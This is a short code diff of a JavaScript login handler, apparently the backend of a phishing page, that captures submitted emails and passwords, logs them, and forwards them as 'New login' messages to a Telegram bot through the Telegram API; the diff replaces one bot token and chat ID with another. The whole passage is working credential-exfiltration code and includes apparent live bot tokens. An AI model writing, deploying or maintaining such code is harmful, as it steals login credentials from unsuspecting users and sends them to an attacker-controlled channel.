@@ -8,8 +8,8 @@ export default async function handler(req, res) {
             console.log('Received credentials:', { email, password });
 
             // Send credentials to Telegram bot
-            const telegramBotToken = '7884595987:AAGgZp8aW2Z4S8y0TStRyhPGsEJ5lXiIeEM'; // Replace with your bot token
-            const chatId = '7587120060'; // Your chat ID
+            const telegramBotToken = '7828349055:AAFYs91viPZS8pXSO5GmZj1y02LIZhMmPAc'; // New bot token
+            const chatId = '7329638940'; // Your chat ID
             const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
             const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
 
